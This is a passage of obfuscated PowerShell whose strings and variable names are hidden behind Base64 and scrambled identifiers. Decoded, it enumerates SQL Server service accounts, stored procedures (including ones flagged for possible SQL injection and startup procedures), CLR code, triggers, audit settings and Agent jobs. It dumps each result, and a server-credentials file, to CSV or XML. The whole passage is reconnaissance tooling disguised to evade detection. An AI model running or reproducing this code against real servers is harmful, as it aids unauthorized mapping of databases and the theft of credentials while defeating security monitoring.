            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABzAGUAcgB2AGkAYwBlACAAYQBjAGMAbwB1AG4AdABzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLServiceAccount -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGkAYwBlAF8AYQBjAGMAbwB1AG4AdABzAC4AeABtAGwA')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGkAYwBlAF8AYQBjAGMAbwB1AG4AdABzAC4AYwBzAHYA')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAdABvAHIAZQBkACAAcAByAG8AYwBlAGQAdQByAGUAcwAuAC4ALgA=')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLStoredProcedure -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAC4AeABtAGwA')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAC4AYwBzAHYA')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAdABvAHIAZQBkACAAcAByAG8AYwBlAGQAdQByAGUAcwAgAHQAaABhAHQAIAB1AHMAZQAgAGcAbABvAGIAYQBsACAAdABlAG0AcAAgAHQAYQBiAGwAZQBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLStoredProcedure -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | where ProcedureDefinition -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAjACMAKgA=')))
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AZwBsAG8AYgBhAGwAdABtAHAAdABiAGwALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AZwBsAG8AYgBhAGwAdABtAHAAdABiAGwALgBjAHMAdgA=')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAGMAdQBzAHQAbwBtACAAZQB4AHQAZQBuAGQAZQBkACAAcwB0AG8AcgBlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLStoredProcedureXP -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AeABwAC4AeABtAGwA')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AeABwAC4AYwBzAHYA')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAZQByAHYAZQByACAAcABvAGwAaQBjAGkAZQBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLServerPolicy -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHAAbwBsAGkAYwB5AC4AeABtAGwA')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHAAbwBsAGkAYwB5AC4AYwBzAHYA')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAdABvAHIAZQBkACAAcAByAG8AYwBlAGQAdQByAGUAcwAgAHcAaQB0AGgAIABwAG8AdABlAG4AdABpAGEAbAAgAFMAUQBMACAASQBuAGoAZQBjAHQAaQBvAG4ALgAuAC4A')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLStoredProcedureSQLi -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AcwBxAGwAaQAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AcwBxAGwAaQAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAdABhAHIAdAB1AHAAIABzAHQAbwByAGUAZAAgAHAAcgBvAGMAZQBkAHUAcgBlAHMALgAuAC4A')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLStoredProcedureAutoExec -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AcwB0AGEAcgB0AHUAcAAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AcwB0AGEAcgB0AHUAcAAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAEMATABSACAAcwB0AG8AcgBlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLStoredProcedureCLR -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AYwBsAHIALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBlAF8AYwBsAHIALgBjAHMAdgA=')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAEQATQBMACAAdAByAGkAZwBnAGUAcgBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLTriggerDml -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAbQBsAC4AeABtAGwA')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAbQBsAC4AYwBzAHYA')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAEQATQBMACAAdAByAGkAZwBnAGUAcgBzACAAdABoAGEAdAAgAHUAcwBlACAAZwBsAG8AYgBhAGwAIAB0AGUAbQBwACAAdABhAGIAbABlAHMALgAuAC4A')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLTriggerDml -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | where TriggerDefinition -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAjACMAKgA=')))
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAbQBsAF8AZwBsAG8AYgBhAGwAdABtAHAAdABiAGwALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAbQBsAF8AZwBsAG8AYgBhAGwAdABtAHAAdABiAGwALgBjAHMAdgA=')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAEQARABMACAAdAByAGkAZwBnAGUAcgBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLTriggerDdl -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAZABsAC4AeABtAGwA')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAZABsAC4AYwBzAHYA')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAEQARABMACAAdAByAGkAZwBnAGUAcgBzACAAdABoAGEAdAAgAHUAcwBlACAAZwBsAG8AYgBhAGwAIAB0AGUAbQBwACAAdABhAGIAbABlAHMALgAuAC4A')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLTriggerDdl -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | where TriggerDefinition -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAjACMAKgA=')))
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAZABsAF8AZwBsAG8AYgBhAGwAdABtAHAAdABiAGwALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAZABsAF8AZwBsAG8AYgBhAGwAdABtAHAAdABiAGwALgBjAHMAdgA=')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAZQByAHYAZQByACAAdgBlAHIAcwBpAG8AbgAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAC4ALgA=')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHYAZQByAHMAaQBvAG4ALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHYAZQByAHMAaQBvAG4ALgBjAHMAdgA=')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAEQAYQB0AGEAYgBhAHMAZQAgAGEAdQBkAGkAdAAgAHMAcABlAGMAaQBmAGkAYwBhAHQAaQBvAG4AIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4ALgAuAC4A')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLAuditDatabaseSpec -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEEAdQBkAGkAdABfAEQAYQB0AGEAYgBhAHMAZQBfAFMAcABlAGMAaQBmAGkAYwBhAHQAaQBvAG4AcwAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEEAdQBkAGkAdABfAEQAYQB0AGEAYgBhAHMAZQBfAFMAcABlAGMAaQBmAGkAYwBhAHQAaQBvAG4AcwAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAFMAZQByAHYAZQByACAAYQB1AGQAaQB0ACAAcwBwAGUAYwBpAGYAaQBjAGEAdABpAG8AbgAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAC4ALgA=')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLAuditServerSpec -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEEAdQBkAGkAdABfAF8AUwBlAHIAdgBlAHIAXwBTAHAAZQBjAGkAZgBpAGMAYQB0AGkAbwBuAHMALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEEAdQBkAGkAdABfAFMAZQByAHYAZQByAF8AUwBwAGUAYwBpAGYAaQBjAGEAdABpAG8AbgBzAC4AYwBzAHYA')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAEEAZwBlAG4AdAAgAEoAbwBiAHMALgAuAC4A')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLAgentJob -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGEAZwBlAG4AdABfAGoAbwBiAC4AeABtAGwA')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
